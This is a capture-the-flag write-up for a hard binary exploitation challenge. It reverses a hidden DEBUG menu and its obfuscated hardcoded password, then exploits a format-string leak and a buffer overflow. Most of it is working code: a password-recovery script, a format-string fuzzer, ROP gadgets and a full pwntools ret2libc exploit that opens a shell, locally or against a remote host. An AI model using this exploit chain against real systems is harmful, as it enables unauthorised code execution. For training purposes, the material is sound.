# [HARD] PWN - Sign Up Here

## Overview
This challenge binary contains 3 vulnerabilities; a format-string vulnerability, a buffer overflow vulnerability, and a poorly encoded hardcoded credential check.

The intended solution is to:
	- Reverse the binary to discover the hidden menu and the password required to access the menu.
	- Find and exploit the format-string vulnerability to leak addresses and values from the stack.
	- Find and exploit the buffer overflow vulnerability to leak LIBC addresses and perform a **ret2libc** attack to spawn a shell.

## Initial Analysis
Disassemble the binary and trace through the standard execution of the binary.

### main()
```
...
while( true ) {
	puts("\n[1] Register an Account");
    puts("[2] Update Account Details");
    puts("[3] View Current Profile");
    puts("[0] Exit");
    printf(data.000025ad);
    read_line((char *)&s1, 0x10);
    iVar1 = strcmp(&s1, data.000025b0);
    if (iVar1 != 0) break;
    	register_account((int64_t)&var_78h);
    }
    iVar1 = strcmp(&s1, data.0000262b);
    if (iVar1 != 0) break;
    	update_account_details((char *)&var_78h);
    }
    iVar1 = strcmp(&s1, data.0000274b);
    if (iVar1 != 0) break;
    	view_current_profile((char *)&var_78h);
    }
    iVar1 = strcmp(&s1, "DEBUG");
    if (iVar1 != 0) break;
        iVar1 = admin_login();
    	if (iVar1 != 0) {
    		puts("\nIncorrect Password!");
        	exit(0);
    	}
        admin_debug_menu((char *)&var_78h);
    }
    pcVar3 = data.000026b8;
    iVar1 = strcmp(&s1, data.000026b8);
    if (iVar1 == 0) {
        puts("\n[+] Exiting...");
	}
```

### admin_login()
```
uint64_t admin_login(void)
{
    int32_t iVar1;
    uint64_t uVar2;
    int64_t in_FS_OFFSET;
    int64_t var_28h;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    printf("\n[?] Admin Debug Password: ");
    read_line((char *)&var_28h, 0x12);
    clear_stdin();
    iVar1 = admin_check_password((char *)&var_28h);
    uVar2 = (uint64_t)(iVar1 != 0);
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = __stack_chk_fail();
    }
    return uVar2;
}
```

### admin_check_password()
```
undefined8 admin_check_password(char *arg1)
{
    var_58h._0_4_ = 0x1c000;
    var_58h._4_4_ = 0x11800;
    var_50h = 0x1c000;
    var_4ch = 0xfc00;
    var_48h = 0x16c00;
    var_44h = 0x23000;
    var_40h = 0x1af33;
    var_3ch = 0x24c00;
    var_38h = 0x1b4cc;
    var_34h = 0x21400;
    var_30h = 0x17ccc;
    var_2ch = 0x23599;
    var_28h = 0x224cc;
    var_24h = 0x28f33;
    var_20h = 0x240cc;
    var_1ch = 0xb8cc;
    var_18h = 0xeb33;
    iVar1 = strlen(arg1);
    if (iVar1 == 0x11) {
        for (var_60h._0_4_ = 0; (int32_t)var_60h < 0x11; var_60h._0_4_ = (int32_t)var_60h + 1) {
            if ((arg1[(int32_t)var_60h] * 0x1c00) / 5 != *(int32_t *)((int64_t)&var_58h + (int64_t)(int32_t)var_60h * 4)
               ) {
                return 1;
            }
        }
        uVar2 = 0;
    } else {
        uVar2 = 1;
    }
    return uVar2;
}
```

### admin_debug_menu()
```
undefined8 admin_debug_menu(char *arg1)
{
    int32_t iVar1;
    undefined8 uVar2;
    int64_t in_FS_OFFSET;
    char *format;
    char *s1;
    char *args;
    char *s;
    int64_t canary;
    
    canary = *(int64_t *)(in_FS_OFFSET + 0x28);
    puts(
        "\n╔════════════════════════════════════╗"
        );
    puts(data.00002460);
    puts(
        "╚════════════════════════════════════╝"
        );
    if (*(int32_t *)(arg1 + 0x60) == 1) {
        snprintf(&args, 0x100, 
                 "Current Registered Username: %s\nCurrent Registered User Email: %s\nCurrent Registered User University: %s\nNumber of Account Modifications: %i\n"
                 , arg1, arg1 + 0x20, arg1 + 0x40, *(undefined4 *)(arg1 + 100));
        sprintf(&s, &args);
        printf("%s\n\n", &s);
    } else {
        puts("\n[!] No Account Registered");
    }
    puts(
        "\n╔════════════════════════════════════╗"
        );
    puts(data.00002540);
    puts(
        "╚════════════════════════════════════╝"
        );
    puts("[1] Report a Player");
    puts("[2] Submit a Bug Report");
    puts("[0] Back to Main Menu");
    printf(data.000025ad);
    read_line((char *)&s1, 0x10);
    iVar1 = strcmp(&s1, data.000025b0);
    if (iVar1 == 0) {
        puts(
            "\n╔════════════════════════════════════╗"
            );
        puts(data.000025b8);
        puts(
            "╚════════════════════════════════════╝"
            );
        printf("\n[REPORT] Player\'s Username: ");
        read_line((char *)&args, 0x20);
        printf("[REPORT] Short Reason for Report: ");
        fgets(&s, 0x200, _stdin);
    } else {
        iVar1 = strcmp(&s1, data.0000262b);
        if (iVar1 == 0) {
            puts(
                "\n╔════════════════════════════════════╗"
                );
            puts(data.00002630);
            puts(
                "╚════════════════════════════════════╝"
                );
            printf("\n[BUG] Bug Report Title: ");
            read_line((char *)&args, 0x10);
            printf("[BUG] Bug Report Description: ");
            read_line((char *)&s, 0x40);
            puts("\n[*] Bug Reported Successfully!");
        } else {
            iVar1 = strcmp(&s1, data.000026b8);
            if (iVar1 == 0) {
                puts("\n[~] Returning to Main Menu...\n");
            } else {
                puts("\n[!] Invalid Option!");
                exit(0);
            }
        }
    }
    uVar2 = 0;
    if (canary != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = __stack_chk_fail();
    }
    return uVar2;
}
```

There is a *hidden* menu which is accessed by sending the string **DEBUG** to the binary when at the main menu.
It is *protected* by a poorly obfuscated hardcoded password.

In the `admin_debug_menu()` function, there is an immediate format-string vulnerability which can be used to leak values from the stack, based on the registered account's username:
```
snprintf(&args, 0x100, 
	"Current Registered Username: %s\nCurrent Registered User Email: %s\nCurrent Registered User University: %s\nNumber of Account M...,
	arg1, arg1 + 0x20, arg1 + 0x40, *(undefined4 *)(arg1 + 100));
sprintf(&s, &args);
printf("%s\n\n", &s);
```

Furthermore, there is also a buffer overflow vulnerability in the `admin_debug_menu()` function, via the **"Report a Player"** option.

## Exploitation
### Protections
```
$ checksec ./sign_up_here
[*] './sign_up_here'
    Arch:       amd64-64-little
    RELRO:      Full RELRO			<--- GOT overwrite is not possible
    Stack:      Canary found		<--- Stack leak is required to leak the canary value (format-string)
    NX:         NX enabled			<--- Shellcode is not executable, ROP is required
    PIE:        PIE enabled			<--- Stack leak required to calculate the PIE base (format-string)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Password de-obfuscation script
```
def obfuscate_char(c):
   return ((ord(c) << 9) * 14) // 5

def reverse_obfuscation(value):
    for i in range(32, 127):  # Printable ASCII range
        if obfuscate_char(chr(i)) == value:
            return chr(i)
    return '?'  # Unknown character

obf_password = [114688, 71680, 114688, 64512, 93184, 143360,
				110387, 150528, 111820, 136192, 97484, 144793,
				140492, 167731, 147660, 47308, 60211]

recovered = ''.join(reverse_obfuscation(val) for val in obf_password)
print("Recovered password:", recovered)
```

`Recovered password: P2P-AdMiN_Debug!*`

### Fuzzing the format-string vulnerability for interesting leaks
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./sign_up_here", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
for i in range(1, 201):
	# Start connection (LOCAL, REMOTE, or GDB)
	p = start()

	#~~~< Exploit Code Here >~~~#
	payload = f"%{i}$p".encode()
	# Register user
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b": ", payload)
	p.sendlineafter(b": ", b"NA")
	p.sendlineafter(b": ", b"NA")

	# Access debug
	p.sendlineafter(b"> ", b"DEBUG")
	p.sendlineafter(b": ", b"P2P-AdMiN_Debug!*")

	p.recvuntil(b"Current Registered Username: ")
	leaked = p.recvline().strip()
	print(f"{i} - {leaked.decode()}")

	# Close connection
	p.close()
```

Running this script against both the local and remote instance will reveal two interesting leak positions.
Position 92 (`%92$p`) leaks the stack canary and position 98 (`%98$p`) will leak the address of the `main()` function.

### Locating gadgets in the binary
```
$ ROPgadget --binary ./sign_up_here 
Gadgets information
============================================================
0x000000000000175a : adc byte ptr [rsi - 0x52], bh ; mov eax, 0 ; leave ; ret
0x00000000000016f8 : adc dword ptr [rdi + rax - 0x48], esi ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x1762
0x0000000000001c9c : add al, ch ; ret 0xfffa
...
0x0000000000001d73 : pop rdi ; ret
...
0x000000000000101a : ret
...
```

## Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./sign_up_here", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

def admin_login():
	# Access debug
	p.sendlineafter(b"> ", b"DEBUG")
	p.sendlineafter(b": ", b"P2P-AdMiN_Debug!*")

def get_stack_leaks():
	# Register user
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b": ", b"%92$p.%98$p")
	p.sendlineafter(b": ", b"NA")
	p.sendlineafter(b": ", b"NA")

	admin_login()

	# Get leaked canary and main() address
	p.recvuntil(b"Current Registered Username: ")
	leaked_canary, leaked_main_address = p.recvlineS().strip().split(".")

	canary = int(leaked_canary, 16)
	main_address = int(leaked_main_address, 16)
	pie_base = main_address - binary.symbols['main']

	p.sendlineafter(b"> ", b"0")

	return canary, main_address, pie_base

def libc_leak(function):
	leak = p64(pie_base + ret_offset)
	leak += p64(pie_base + pop_rdi_offset)
	leak += p64(pie_base + binary.got[function])
	leak += p64(pie_base + binary.plt['puts'])
	leak += p64(pie_base + ret_offset)
	leak += p64(pie_base + binary.symbols['main'])
	return leak

# Exploitation code
offset = 264

pop_rdi_offset = 0x0000000000001d73
ret_offset = 0x000000000000101a # ret;

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
info("Leaking Stack Canary and main() Address\n\n")
canary, main_address, pie_base = get_stack_leaks()
success(f"Leaked Stack Canary:\t{hex(canary)}")
success(f"Leaked main() Address:\t{hex(main_address)}")
success(f"Calculated PIE Base:\t{hex(pie_base)}\n\n")

libc_func_addresses = {"printf": "", "snprintf": "", "fgets":"", "getchar": "", "setvbuf": ""}

# Pass SKIP=True when running the exploit to only leak the address of printf() (Only what is required for the exploit)
for func in ["printf"] if args.SKIP else ["printf", "snprintf", "fgets", "getchar", "setvbuf"]:
	buffer = b"A"*offset
	buffer += p64(canary)
	buffer += p64(0xdeadbeefdeadbeef)
	buffer += libc_leak(func)

	admin_login()

	# Buffer overflow
	p.sendlineafter(b"> ", b"1")
	p.sendlineafter(b": ", b"NA")
	p.sendlineafter(b": ", buffer)

	leaked_libc_address = p.recvline()
	leaked_libc_address = u64(leaked_libc_address.strip().ljust(8, b"\x00"))
	libc_func_addresses[func] = hex(leaked_libc_address)
	info(f"Leaked {func} Address:\t{hex(leaked_libc_address)}")

else:
	print()

libc_base = int(libc_func_addresses["printf"], 16) - 0x61c90
success(f"LIBC Base:\t{hex(libc_base)}\n\n")

system_address = libc_base + 0x52290
info(f"LIBC system() Address:\t{hex(system_address)}")
bin_sh_address = libc_base + 0x1b45bd
info(f"LIBC '/bin/sh' Address:\t{hex(bin_sh_address)}")
exit_address = libc_base + 0x46a40
info(f"LIBC exit() Address:\t{hex(exit_address)}\n\n")

shell_buffer = b"A"*offset
shell_buffer += p64(canary)
shell_buffer += p64(0xdeadbeefdeadbeef)
shell_buffer += p64(pie_base + ret_offset)
shell_buffer += p64(pie_base + pop_rdi_offset)
shell_buffer += p64(bin_sh_address)
shell_buffer += p64(system_address)
shell_buffer += p64(libc_base + 0x0000000000046a40)

admin_login()

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b": ", b"NA")
p.sendlineafter(b": ", shell_buffer)

success("Enjoy Your Shell...")
p.interactive()

# Close connection
p.close()
```
